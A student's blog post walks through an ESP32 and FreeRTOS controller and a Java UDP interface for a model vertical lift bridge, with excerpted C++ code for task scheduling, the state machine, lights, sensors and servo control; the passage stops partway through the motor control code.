[{"content":"What was the Project?\rThis was a really fun project I got to work on for my ENGG3000 unit at university. The objective was simple: we had to build and demonstrate a small-scale vertical lift bridge from scratch. It was a multi-disciplinary project with two groups for each bridge, a Systems Group (Software, Electrical and Mechatronics majors) and a Structures Group (Civil and Mechanical majors).\nAs part of the systems group we were responsible for creating all the hardware and software that would allow full control of the bridge: sensors (ultrasonic and weight sensors), power systems, motor control through Pulse Width Modulation (PWM) signals, and LED traffic light systems using shift registers. My role in all this was two-fold, create a multi-threaded C++ program for an ESP32 which would act as the bridge controller and create a remote user interface that would allow users to monitor and control the bridge.\nThis post is going to go through the entire project; from requirements to the final product that we delivered alongside all the design decisions made and challenges faced (all the fun stuff). This is what the bridge and remote interface looked like for the final demonstration:\nAll the source code for this project, that is referenced in this post, can be found in these two repositories (totally has a descriptive commit messages):\nESP32 Bridge Controller Source Code\nJava GUI Source Code\nIf you don\u0026rsquo;t want to read the entire code explanation, you can skip all the yap and go to the photos/video.\nOverview of the System\rRequirements\rA week before the unit started, we were given specific requirements for what the bridge should be able to do. These were the relevant requirements summarised from the specifications:\nThe bridge is to have an automatic control system that detects the arrival of shipping traffic. When shipping traffic arrives, it should signal for the boat to wait, safely signal vehicular and pedestrian traffic to stop, and then open the bridge. Once the shipping traffic has passed through safely, the bridge should close and allow vehicular and pedestrian traffic to resume crossing the river. The control system must provide some form of local visual indication of the state of the sensors and system. It must also provide a remote user interface on a computer that shows the state of the bridge, sensors and system, and allow the control of all bridge operations including overriding sensor inputs. Ideally, the user interface will be wirelessly connected to the control system via Wi-Fi. The bill of materials for building the bridge must not exceed AUD$100. System Architecture\rBased on the requirements above my team decided on using an ESP32 DevKit v1 board as the bridge controller and a Java program for the remote interface. These two components were the main parts and would communicate wirelessly. This is a really high level overview of the main functions of the two components:\nESP32 Bridge Controller\rRuns multi-threaded FreeRTOS tasks across two CPU cores. Controls all the sensors, motors and traffic lights. Is able to run in two modes; automatic and override. Sends status updates to the Java program every second over UDP. Java Remote Interface\rShows the real time state of the bridge. Allows the operator to switch between automatic and override modes. Allow control of the bridge, gates and lights in override mode. Sends a heartbeat message to the ESP32 every 2 seconds to maintain connection. High Level Diagram\rPutting all that into a visual perspective:\nTechnologies Used\rSince there were two parts to this project (the Java program and ESP32 C++ program) there was a variety of technologies that I got to work with. I\u0026rsquo;ve summarised them as best as I could below.\nESP32 Development\rPlatformIO VSCode Extension for development and building. Arduino Framework for the ESP32 programming. FreeRTOS for managing the multi-threaded tasks. WifiUDP Library for UDP network communications. LEDC for PWM motor and buzzer control. PulseIn for ultrasonic sensor readings. ESP32 Peripherals\r6x HC-SR04 Ultrasonic Sensors (traffic detection, bridge position and clearance). 1x LM258P Op-Amp (weight on bridge sensing through the motor current). 2x SN74HC595N Shift Registers (LED traffic light control). 1x FS5109R Servo (motor to control the bridge). 1x FS90 9g Micro Servo (motor to control boom gates (closed when bridge is open to stop road traffic)). 1x Piezo Buzzer (buzzer for audio warnings while the bridge is moving). 1x Photo-Resistor, couldn\u0026rsquo;t find the link :/ (used for controlling the white bridge lights and allow them to act as street lights). Java Development\rJava Swing for the GUI. DatagramSocket and DatagramPacket for UDP network communication. Thread library for concurrent send and receive operations. Network Configuration\rUDP on port 3031 (ESP32 listens on this) and port 3032 (the Java program listens on this). There is a standard text based message format where key-value pairs are pipe-delimited. Bridge status updates every 1 second. Heartbeat messages from the Java program to the ESP32 every 2 seconds. Testing and Simulation\rFor testing we used Wokwi (paid for a private gateway) which is an ESP32 simulator. Used pre-processing directives (#define WOKWI_SIMULATION and #ifdef WOKWI_SIMULATION) to mock sensor readings. ESP32\rNow for the fun part; the actual code implementation for the ESP32. The code base is pretty large so I can\u0026rsquo;t explain it line by line. Instead I\u0026rsquo;ve decided to explore and go through the code based on the main functionalities and features (and just anything that I found really fun to learn).\nPurpose and the Operating Modes\rThe main purpose of all the code on the ESP32 is to essentially be the \u0026ldquo;brain\u0026rdquo; of the bridge system. So this means continuously running and monitoring the sensor inputs, controlling the servos based on this input and controlling all the traffic flow. There are two main modes in which the ESP32 can operate:\nAutomatic Mode (Default):\nIn this mode the ESP32 continuously monitors the road and boat traffic sensors. Based on whether the bridge is open or closed, if there is traffic waiting for bridge to change its state (e.g. boats waiting for bridge to open), the opening/closing sequences will be initiated. The two sequences are OPENING_FOR_BOATS and CLOSING_FOR_CARS. After the sequence is complete the bridge will go into either a CARS_PASSING or BOATS_PASSING state (for 10 seconds) to allow for traffic to pass. After the passing states the bridge will go into the IDLE state. From this state the cycle will repeat depending on input from the traffic sensors. This mode doesn\u0026rsquo;t require any user/operator for it work. Override Mode (Manual Control):\nThis mode allows the operators to individually control all parts of the bridge (traffic lights, buzzer and bridge/gate positions). The operator can also trigger the OPENING_FOR_BOATS and CLOSING_FOR_CARS sequences alongside a TESTING sequence. Commands are queued and there is a max of 3 to prevent a buffer overflow. There are safety checks to prevent the bridge from entering this mode if there is traffic. This is implemented since the use case for this mode is to allow for a bridge operator to test the bridge and its functions not for manually managing traffic. Types and State Definitions\rFor the different states that all the various parts of the system can be in, I\u0026rsquo;ve created readable enums to prevent any invalid states during compilation or while the program is running:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* Global Enums */ // Represents whether code is in automatic or override state, auto by default enum OperationalMode { AUTOMATIC, OVERRIDE }; // Represents whether the bridge is opened, closed or in an unknown state enum BridgeGateState { CLOSED, OPEN, UNKNOWN }; // Represents state of boat and road lights enum LightColours { RED, GREEN, YELLOW, NONE, ALL }; // Represents whether bridge lights should be on or off enum BridgeLightState { ON, OFF }; // Represents whether the buzzer sound should be on or off enum BuzzerSound { SOUND, NO_SOUND }; // Represents which motor to move enum Motor { BRIDGE, GATE }; // Represents which sensor to read from enum AdcValue { PHOTO_RESISTOR, BRIDGE_WEIGHT }; // Bridge sequence state enum BridgeSequenceState { IDLE, OPENING_FOR_BOATS, BOATS_PASSING, CLOSING_FOR_CARS, CARS_PASSING, DIAGNOSTIC, TESTING }; // Represents which stage the bridge is at while moving enum BridgeMovementState { STATE_ONE, STATE_TWO, STATE_THREE, STATE_FOUR, STATE_FIVE, RECOVERY, SUCCESS }; State Machine and Multi-Core Architecture\rSince the ESP32 we used has a dual-core processor it allowed us to separate the motor control and the actual decision logic onto their own threads. The reason we decided to separate it this way was so that we were able to run the motor operations without any interruptions, have the processing of sensor inputs running and communication with the Java program maintained all at the same time.\nThis is how the tasks were allocated on the two cores:\nCore 0 (Protocol CPU) - Motor Control Tasks:\nBridge motor control task. Gate motor control task. Executes commands from the queues. Core 1 (Application CPU) - Decision Logic:\nRuns the automatic mode sequences. Executes commands from the override command queue. Runs the main loop which includes communication with the Java program. Creating the tasks:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 // Tasks for Multithreading TaskHandle_t AutomaticModeTask; TaskHandle_t BridgeControlTask; TaskHandle_t GateControlTask; TaskHandle_t OverrideQueueTask; // Create tasks xTaskCreatePinnedToCore(automaticModeTask, // Task function \u0026#34;AutomaticMode\u0026#34;, // Name 10000, // Stack size NULL, // Parameter 2, // Priority (higher than motor tasks) \u0026amp;AutomaticModeTask, // Task handle 1); // Core 1 (Application CPU) xTaskCreatePinnedToCore(bridgeControlTask, // Task function \u0026#34;BridgeControl\u0026#34;, // Name 4096, // Stack size NULL, // Parameter 1, // Priority \u0026amp;BridgeControlTask, // Task handle 0); // Core 0 (Protocol CPU) xTaskCreatePinnedToCore(gateControlTask, // Task function \u0026#34;GateControl\u0026#34;, // Name 4096, // Stack size NULL, // Parameter 1, // Priority \u0026amp;GateControlTask, // Task handle 0); // Core 0 (Protocol CPU) xTaskCreatePinnedToCore(overrideQueueTask, // Task function \u0026#34;OverrideQueue\u0026#34;, // Name 4096, // Stack size NULL, // Parameter 3, // Priority (highest - processes overrides) \u0026amp;OverrideQueueTask, // Task handle 1); // Core 1 (Application CPU) Concurrency Justification\rThis concurrency was important for a couple of reasons:\nThe sensor readings were not just for the traffic but also for knowing when to stop rotating the bridge servo. This sounds overkill but actually makes sense.\nWe initially had the bridge servo rotate for 5 seconds (in either direction) for opening and closing. However, we needed the bridge to be precise in terms of where it stopped and this timing method had a lot of variables. First was that the servo would rotate quicker if there was more power going to it and this was never going to be consistent since we can\u0026rsquo;t control the variance in how much current it draws. Second, this would vary even more as the servo got used more due to wear. So our solution was to have an ultrasonic sensor on top of the bridge. The motor would stop moving once the bridge was at a certain distance giving a more precise and consistent bridge position every time. When we got to the testing phase we discovered that running the motors created electromagnetic interference (EMI) that caused the ultrasonic sensor readings to be invalid (there wouldn\u0026rsquo;t be a reading at all).\nThe reason for this EMI was due to the design of the circuit board (PCB). So the solution expanded on the first point. We were still going to have a distance based bridge movement system instead of a time based one but it would be a stop-measure-restart cycle. The motor would have to stop in between readings (150ms between the motor moving and the first reading), take 3 readings (average them) and then restart the motor if the target wasn\u0026rsquo;t reached. This sequence needed to run in parallel with the decision logic and network operations. Because of the cycle approach to the bridge motor movement, the demonstration ended up having a \u0026ldquo;choppy\u0026rdquo; feel. The bridge would open/close through small movements (this included the buzzer noise which we decided should be on when the bridge is moving). The emergency stop command needed to halt the motors instantly, regardless of what the decision logic is doing. Since the motor control was on a different core, stopMotor() functions execute without waiting for the state machine or network packets to be processed.\nFreeRTOS Tasks and Queues\rFor communication between the two cores, we used FreeRTOS queues. This allowed both cores to \u0026ldquo;talk\u0026rdquo; to each other without having to directly call upon their functions, meaning that the decision logic could send commands for the motor tasks to consume rather than directly controlling the motors.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // Command structures struct OverrideCommand { char command[50]; }; struct BridgeCommand { BridgeGateState desiredState; }; struct GateCommand { BridgeGateState desiredState; }; // Create queues QueueHandle_t bridgeCommandQueue = xQueueCreate(5, sizeof(BridgeCommand)); QueueHandle_t gateCommandQueue = xQueueCreate(5, sizeof(GateCommand)); QueueHandle_t pendingOverrideQueue = xQueueCreate(10, sizeof(OverrideCommand)); So say when the automatic mode task decides the bridge should open since there is boat traffic waiting, it doesn\u0026rsquo;t open the bridge directly, it queues the command instead by calling changeBridgeStateAsync:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 void changeBridgeStateAsync(BridgeGateState desiredMode) { // Check if enough time has passed since last bridge state change extern unsigned long lastBridgeStateChange; unsigned long currentTime = millis(); if (currentTime - lastBridgeStateChange \u0026lt; BRIDGE_STATE_CHANGE_COOLDOWN) { Serial.println(\u0026#34;INFO: Bridge state change blocked, cooldown period active\u0026#34;); sendUpdate(\u0026#34;SYSTEM_UPDATE: dequeued_last_message\u0026#34;); return; } extern BridgeGateState currentBridgeState; extern QueueHandle_t bridgeCommandQueue; // Update the queue if the desired and current states aren\u0026#39;t the same if (desiredMode != currentBridgeState) { BridgeCommand cmd = {desiredMode}; xQueueSend(bridgeCommandQueue, \u0026amp;cmd, 0); } } The bridge control task (on Core 0) then waits for these commands (in this case opening the bridge) and then executes them. The code snippet below shows how the bridgeControlTask works for opening the bridge. The logic for closing the bridge and weight checks have been removed. I just want to show how the queues are being used and our stop-measure-restart cycle.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 void bridgeControlTask(void *parameter) { // Command can either be OPEN or CLOSED BridgeCommand cmd; // Runs forever for (;;) { // When a command is received (either from automatic mode or override) it wakes up if (xQueueReceive(bridgeCommandQueue, \u0026amp;cmd, portMAX_DELAY)) { // Take mutex before changing state if (xSemaphoreTake(stateMutex, portMAX_DELAY)) { // ... If desired state is CLOSED else if (cmd.desiredState == OPEN \u0026amp;\u0026amp; currentBridgeState != OPEN) { // Check weight on bridge Serial.println(\u0026#34;INFO: Checking weight on the bridge\u0026#34;); // Release for weight check xSemaphoreGive(stateMutex); long weightReading = checkBridgeWeight(); // Send weight reading to Java sendUpdate(\u0026#34;WEIGHT_CHECK: \u0026#34; + String(weightReading)); // Re-acquire lock xSemaphoreTake(stateMutex, portMAX_DELAY); // ... weight checking logic Serial.println(\u0026#34;INFO: Weight check passed (\u0026#34; + String(weightReading) + \u0026#34;), opening bridge\u0026#34;); // Rotate the motor to open the bridge rotateMotorForOpen(BRIDGE); // Release mutex briefly to allow motor to start xSemaphoreGive(stateMutex); vTaskDelay(200 / portTICK_PERIOD_MS); xSemaphoreTake(stateMutex, portMAX_DELAY); // Update the timestamp when bridge state change begins lastBridgeStateChange = millis(); // Track how long it takes to open the bridge unsigned long operationStartTime = millis(); // Release mutex xSemaphoreGive(stateMutex); // Read how far away the bridge is long bridgeDistance; // Booleans to keep track of errors bool bridgeIsOpen = false; bool timeoutOccurred = false; // Greater than bridge open distance since bridge is moving closer // Bridge starts at 15cm (CLOSED), moves to 1cm (OPEN) while (bridgeDistance \u0026gt; BRIDGE_OPEN_DISTANCE) { // Timeout protection if (millis() - operationStartTime \u0026gt; BRIDGE_TIMEOUT) { timeoutOccurred = true; break; } // Stop motor for stable reading (avoid EMI interference) stopMotor(BRIDGE); // Wait for motor to fully stop and EMI to settle vTaskDelay(150 / portTICK_PERIOD_MS); // Take multiple readings and average them to filter out noise/EMI long reading1, reading2, reading3; bool valid1, valid2, valid3; // Calculate average of valid readings int validCount = 0; long sum = 0; if (valid1) { sum += reading1; validCount++; } if (valid2) { sum += reading2; validCount++; } if (valid3) { sum += reading3; validCount++; } if (validCount == 0) { Serial.println(\u0026#34;ERROR: All sensor readings invalid - EMI or sensor failure\u0026#34;); break; } bridgeDistance = sum / validCount; if (validCount \u0026lt; 3) { Serial.print(\u0026#34;WARNING: Only \u0026#34;); Serial.print(validCount); Serial.println(\u0026#34;/3 readings valid, using average\u0026#34;); } Serial.print(\u0026#34;INFO: Bridge distance (averaged): \u0026#34;); Serial.print(bridgeDistance); Serial.println(\u0026#34; cm\u0026#34;); // Only restart motor if bridge hasn\u0026#39;t reached target if (bridgeDistance \u0026gt; BRIDGE_OPEN_DISTANCE) { rotateMotorForOpen(BRIDGE); // Give motor time to build momentum before next check vTaskDelay(200 / portTICK_PERIOD_MS); } } // Check if we successfully reached open position if (bridgeDistance \u0026lt;= BRIDGE_OPEN_DISTANCE \u0026amp;\u0026amp; !timeoutOccurred) { bridgeIsOpen = true; } if (xSemaphoreTake(stateMutex, portMAX_DELAY)) { // Stop the motor and update the bridge state stopMotor(BRIDGE); if (bridgeIsOpen) { currentBridgeState = OPEN; Serial.println(\u0026#34;INFO: Bridge is OPEN\u0026#34;); } else if (timeoutOccurred) { currentBridgeState = UNKNOWN; Serial.println(\u0026#34;ERROR: Bridge state UNKNOWN after timeout\u0026#34;); } else { currentBridgeState = UNKNOWN; Serial.println(\u0026#34;ERROR: Bridge state UNKNOWN due to sensor failure or unknown error\u0026#34;); } // Release mutex xSemaphoreGive(stateMutex); } } // If it\u0026#39;s another command then release the mutex else { xSemaphoreGive(stateMutex); } } } } } The same logic is used for the gate task.\nMutex Protection\rWhile queues are being used to handle the communication between the tasks, shared variables still need to be protected from race conditions. In the code snipped you can see the use of xSemaphoreTake to try and acquire the mutex during the actual bridge movement logic. This mutex acquisition is also being used at the beginning of each task:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // Mutex declaration SemaphoreHandle_t stateMutex; // In automatic mode task (Core 1) if (xSemaphoreTake(stateMutex, 100 / portTICK_PERIOD_MS)) { // Safe to read/write shared state if (currentOperationalMode == AUTOMATIC) { switch (currentSequenceState) { // ... The state machine logic } } xSemaphoreGive(stateMutex); } // In motor control task (Core 0) if (xSemaphoreTake(stateMutex, portMAX_DELAY)) { stopMotor(BRIDGE); // Updating a shared variable currentBridgeState = OPEN; xSemaphoreGive(stateMutex); } The 100ms timeout in the automatic mode makes sure that no deadlocks happen. If it can\u0026rsquo;t acquire the mutex within 100ms then it\u0026rsquo;ll try again in 500ms. The motor/bridge tasks use portMAX_DELAY since the only run when specifically told to.\nAutomatic Mode State Machine\rThe automatic mode task then utilises the bridge and gate tasks as a part of the main core bridge sequencing logic, running every 500ms on Core 1:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 void automaticModeTask(void *parameter) { TickType_t xLastWakeTime = xTaskGetTickCount(); for (;;) { if (xSemaphoreTake(stateMutex, 100 / portTICK_PERIOD_MS)) { if (currentOperationalMode == AUTOMATIC \u0026amp;\u0026amp; !isBridgeMovementExecutingInOverride) { switch (currentSequenceState) { case IDLE: // Check for traffic and initiate sequences if (canChangeBridge) { if (currentBridgeState == CLOSED) { long boatDistance = readUltrasonicDistanceBoatTraffic(); if (isValidSensorReading(boatDistance) \u0026amp;\u0026amp; boatDistance \u0026lt; BOATS_WAITING_DISTANCE) { currentSequenceState = OPENING_FOR_BOATS; sequenceStartTime = millis(); } } // Check for cars when bridge is open... } break; case OPENING_FOR_BOATS: // Sequence with timing and safety checks break; case BOATS_PASSING: // Wait 10 seconds before checking for more traffic break; case CLOSING_FOR_CARS: // Similar to OPENING_FOR_BOATS but in reverse break; case CARS_PASSING: // Wait 10 seconds before returning to IDLE break; case DIAGNOSTIC: // Attempt position recovery break; } } xSemaphoreGive(stateMutex); } vTaskDelayUntil(\u0026amp;xLastWakeTime, 500 / portTICK_PERIOD_MS); } } The 500ms interval was chosen just to ensure that CPU cycles aren\u0026rsquo;t wasted. The vTaskDelayUntil function makes sure that this logic runs at that 500ms interval regardless of how long the logic takes to run. Since the entire logic for the automatic task is too much to fit in this post here\u0026rsquo;s the complete opening sequence with all the timing and safety checks:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 case OPENING_FOR_BOATS: // Execute the sequence for opening the bridge { // currentMovementState is used here to ensure the functions aren\u0026#39;t called again causing // cooldown blocks unsigned long elapsed = millis() - sequenceStartTime; // After 2s turn road traffic lights yellow if (elapsed \u0026gt;= 2000 \u0026amp;\u0026amp; currentMovementState == STATE_ONE) { // After 2 seconds set the road lights to yellow setRoadTrafficLights(YELLOW); currentMovementState = STATE_TWO; } // After 8s set road traffic lights to red and close the gate else if (elapsed \u0026gt;= 8000 \u0026amp;\u0026amp; currentMovementState == STATE_TWO) { // After 8 seconds set the road lights to red and close the gates setRoadTrafficLights(RED); changeGateStateAsync(CLOSED); currentMovementState = STATE_THREE; } // After 14s open bridge, 6s for gate to close (5s transition + 1s buffer) else if (elapsed \u0026gt;= 14000 \u0026amp;\u0026amp; currentMovementState == STATE_THREE) { changeBridgeStateAsync(OPEN); currentMovementState = STATE_FOUR; } // After 25s, Check results (14s + 11s for bridge to open and stabilize) else if (elapsed \u0026gt;= 25000 \u0026amp;\u0026amp; currentMovementState == STATE_FOUR) { // Reset movement state currentMovementState = STATE_ONE; // Go into diagnostics mode if the bridge state is unknown if (currentBridgeState == UNKNOWN) { currentSequenceState = DIAGNOSTIC; break; } // Allow up to 13 more seconds for the bridge to fully stop moving if (currentBridgeState != OPEN \u0026amp;\u0026amp; elapsed \u0026lt; 38000) { currentMovementState = STATE_FOUR; break; } // If for some reason the bridge didn\u0026#39;t open then set boat lights to red, open gate and go into RECOVERY if (currentBridgeState != OPEN) { setBoatTrafficLights(RED); changeGateStateAsync(OPEN); currentMovementState = RECOVERY; Serial.println(\u0026#34;Info: Bridge state mismatch, expected OPEN, returning to CARS_PASSING\u0026#34;); sendUpdate(\u0026#34;SYSTEM_UPDATE: bridge_state_mismatch\u0026#34;); break; } // Bridge is open, set boat lights to green setBoatTrafficLights(GREEN); currentMovementState = SUCCESS; } // After 30s If the bridge is in recovery state (bridge remains closed), set road lights to green and // go into CARS_PASSING else if (elapsed \u0026gt;= 30000 \u0026amp;\u0026amp; currentMovementState == RECOVERY) { // Ensure gate is open before transitioning to CARS_PASSING changeGateStateAsync(OPEN); // Release mutex during delay xSemaphoreGive(stateMutex); // Wait 5s for gate to open vTaskDelay(GATE_TRANSITION_INTERVAL / portTICK_PERIOD_MS); xSemaphoreTake(stateMutex, portMAX_DELAY); setRoadTrafficLights(GREEN); currentSequenceState = CARS_PASSING; currentMovementState = STATE_ONE; sequenceStartTime = millis(); } // After 25s if bridge has opened, set boat traffic lights to green and go into BOATS_PASSING else if (elapsed \u0026gt;= 25000 \u0026amp;\u0026amp; currentMovementState == SUCCESS) { currentSequenceState = BOATS_PASSING; currentMovementState = STATE_ONE; sequenceStartTime = millis(); Serial.println(\u0026#34;Bridge opened: Waiting for boats to pass\u0026#34;); } } break; This sequence based approach turned out to work really well but was hell during testing. Simulating it was one thing, but manually having to figure out what an appropriate amount of time for each state was took forever since a lot of the times checking success states too early causes false failures since the bridge was still moving. The same exact logic but in reverse was used for closing the bridge. The CARS_PASSING and BOATS_PASSING states were essentially just 10 second delays to ensure the traffic had enough time to pass.\nThe override mode also followed the same logic except rather than the CLOSING_FOR_CARS and OPENING_FOR_BOATS being triggered by the sensor inputs they would be triggered by the commands sent from the Java program. There is also another state in the automatic mode (DIAGNOSTIC) but it\u0026rsquo;s a safety feature so I\u0026rsquo;ll discuss it in this section.\nLight Control\rAnother part of this project that was really fun to implement were the traffic and bridge LED lights. These two types of lights had their own purpose. So there were traffic lights for the road traffic (red, yellow and green) and boat traffic (red and green). The bridge lights (only white) were controlled by a photo-resistor. The bridge lights were supposed to act as \u0026ldquo;street lights\u0026rdquo; so when the photo-resistor gets covered (simulating night time), the bridge lights go on.\nAll these lights were on two shift registers that were daisy chained. The fun part about this was figuring out which bits on the shift corresponded to which lights. We also ran into the issue of the shift register not updating properly. Since there were 16 lights in total, each having their own bit this meant that we would be able to control all the lights using two bytes.\nThe first thought that comes to mind when wanting to update the lights is to have two separate bytes, update the necessary bits and then shift out the byte for the first shift register then the second byte. This in theory should turn on and off lights right, but what ended up happening was that the lights that had their bits set to 1 wouldn\u0026rsquo;t update when you pushed out the 0 bit. So eventually all the lights would just be on. I still don\u0026rsquo;t know why this was the case but the solution that I ended up implementing was to clear out both shift register with zeroed out bytes and then shifting the bytes for the shift registers. There were three different functions to control the lights (two traffic and one bridge). These functions also show which bits on which bytes correspond to which traffic/bridge light:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 // Function to update the lights via shift register void updateLights() { // Set all lights off to avoid the issue with lights not turning off properly // Shift registers don\u0026#39;t seem to dynamically update the lights so 0 them out first digitalWrite(LATCH_PIN, LOW); shiftOut(DATA_PIN, CLOCK_PIN, MSBFIRST, 0); shiftOut(DATA_PIN, CLOCK_PIN, MSBFIRST, 0); digitalWrite(LATCH_PIN, HIGH); // Start by setting the latch low digitalWrite(LATCH_PIN, LOW); // Shift out the byte to the shift register shiftOut(DATA_PIN, CLOCK_PIN, MSBFIRST, lightStatesRegister2); shiftOut(DATA_PIN, CLOCK_PIN, MSBFIRST, lightStatesRegister1); // Latch the data to the outputs digitalWrite(LATCH_PIN, HIGH); } // Set road/boat traffic lights void setRoadTrafficLights(LightColours desiredColour) { // Clear bits 0, 1, 2 (road traffic light bits) lightStatesRegister1 = (lightStatesRegister1 \u0026amp; 0b00011111); Serial.print(\u0026#34;INFO: Current road traffic light state: \u0026#34;); // Update tracking variable currentRoadTrafficLight = desiredColour; // Set the desired light using |= which is a bitwise OR operator switch (desiredColour) { case RED: // Bit 0 lightStatesRegister1 |= 0b00100000; Serial.println(\u0026#34;Red\u0026#34;); break; case YELLOW: // Bit 1 lightStatesRegister1 |= 0b01000000; Serial.println(\u0026#34;Yellow\u0026#34;); break; case GREEN: // Bit 2 lightStatesRegister1 |= 0b10000000; Serial.println(\u0026#34;Green\u0026#34;); break; case NONE: // All off lightStatesRegister1 |= 0b00000000; Serial.println(\u0026#34;None\u0026#34;); break; case ALL: // All on (Bits 0-2) lightStatesRegister1 |= 0b11100000; Serial.println(\u0026#34;All\u0026#34;); break; } // Update shift register updateLights(); } void setBoatTrafficLights(LightColours desiredColour) { // Clear bits 3 and 4 (boat light bits) lightStatesRegister1 = (lightStatesRegister1 \u0026amp; 0b11100111); Serial.print(\u0026#34;INFO: Current boat traffic light state: \u0026#34;); // Update tracking variable currentBoatTrafficLight = desiredColour; // Set the desired light switch (desiredColour) { case RED: // Bit 3 lightStatesRegister1 |= 0b00001000; Serial.println(\u0026#34;Red\u0026#34;); break; case GREEN: // Bit 4 lightStatesRegister1 |= 0b00010000; Serial.println(\u0026#34;Green\u0026#34;); break; case NONE: // All off lightStatesRegister1 |= 0b00000000; Serial.println(\u0026#34;None\u0026#34;); break; case ALL: // All on (Bits 3-4) lightStatesRegister1 |= 0b00011000; Serial.println(\u0026#34;All\u0026#34;); break; } // Update shift register updateLights(); } void setBridgeLights(BridgeLightState desiredState) { if (currentBridgeLightState != desiredState) { currentBridgeLightState = desiredState; switch (desiredState) { case ON: lightStatesRegister1 |= 0b00000111; lightStatesRegister2 = 0b11111111; updateLights(); Serial.println(\u0026#34;INFO: Current bridge light state: on\u0026#34;); break; case OFF: lightStatesRegister1 \u0026amp;= 0b11111000; lightStatesRegister2 = 0b00000000; updateLights(); Serial.println(\u0026#34;INFO: Current bridge light state: off\u0026#34;); break; } } } Sensor Readings\rFor the sensor readings, we had three different types of values to read in. The first was the distance returned from the ultrasonic sensor, the second was the value (not exactly sure what unit it is) returned from the weight sensor (OP amp) and the third (also don\u0026rsquo;t know the unit) was the value from the photo-resistor.\nA cool thing that we discovered when testing was that when two ultrasonic sensors are put into the same pin (on the ESP) and you try to read the value, the closest value is returned. This was pretty useful since in total we had 6 ultrasonic sensors - two on either side of the bridge for boat traffic, two on either side of road traffic, one for determining where the bridge was and one under the bridge to determine if there were boats underneath. So since the closest distance is returned we only had to assign 8 pins (2 each, explained below) in total for the ultrasonic sensors and the traffic logic would still work (if traffic was waiting on one side and not the other the closest distance would tell us that there is traffic).\nThe way that the readings from these ultrasonics are calculated is also really cool. There are two pins each ultrasonic needs; a Trig and Echo pin. The trig pin sends a short pulse and the echo pin detects this reflected pulse. The ESP then uses this formula to determine the distance:\nDistance = (Time x Speed of Sound) / 2\nIn terms of code this would look something like:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 long readUltrasonicDistanceBoatTraffic() { // Send a 10-microsecond pulse to the trigPin digitalWrite(BOAT_TRAFFIC_TRIG_PIN, LOW); delayMicroseconds(2); digitalWrite(BOAT_TRAFFIC_TRIG_PIN, HIGH); delayMicroseconds(10); digitalWrite(BOAT_TRAFFIC_TRIG_PIN, LOW); // Measure the time it takes for the pulse to return on the echoPin - 30ms timeout long duration = pulseIn(BOAT_TRAFFIC_ECHO_PIN, HIGH, 30000); // If no valid reading, return a large distance (ie no boats) if (duration == 0) { Serial.println(\u0026#34;INFO: Boat traffic no sensor connected or invalid reading\u0026#34;); return 9999; } // Calculate the distance in centimeters // Speed of sound is 0.0343 cm/us long distance = (duration * 0.0343) / 2; Serial.print(\u0026#34;INFO: Boat traffic distance in cm: \u0026#34;); Serial.println(distance); // Return the distance value return distance; } The logic for reading the sensor value for the photo-resistor and OP amp were identical. It was just reading the analog value of the pin using the analogRead function. Since I didn\u0026rsquo;t know what the units of the values being returned were, we just figured out how much weight was \u0026ldquo;too much\u0026rdquo; for the bridge and what value translated to night time from the photo-resistor. In code this looked like this:\n1 2 3 4 5 6 7 8 9 10 11 // Function to read adc values long readAdcSensorValue(AdcValue sensor) { switch (sensor) { case PHOTO_RESISTOR: return analogRead(PHOTO_RESISTOR_PIN); case BRIDGE_WEIGHT: return analogRead(BRIDGE_WEIGHT_SENSOR_PIN); default: return 0; } } Motor Control\rThis was another part of the bridge system that took a long time to get working properly. Since we were using continuous servos, we discoverd through that the standard Arduino Servo.h library was not giving us control of the servos as intended. The Arduino library was intended for \u0026ldquo;positional\u0026rdquo; servos (meaning that the servos know which angle they are at, 0-180 degrees). On top of this the library can\u0026rsquo;t control the speed/direction. So instead (after a lot of research and trial and error), we used the ledcWrite function. You essentially pass a PWM (with a custom dutyCycle that we had to manually figure out) to rotate the motor. Code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // Rotation for opening --\u0026gt; Can either be BRIDGE or GATE void rotateMotorForOpen(Motor motorToMove) { // Rotate the motor in one direction (600 microseconds, clockwise) int dutyCycleCW = (600 / 20000.0) * 255; // Rotate according motor, make noise through buzzer and print in console switch (motorToMove) { case 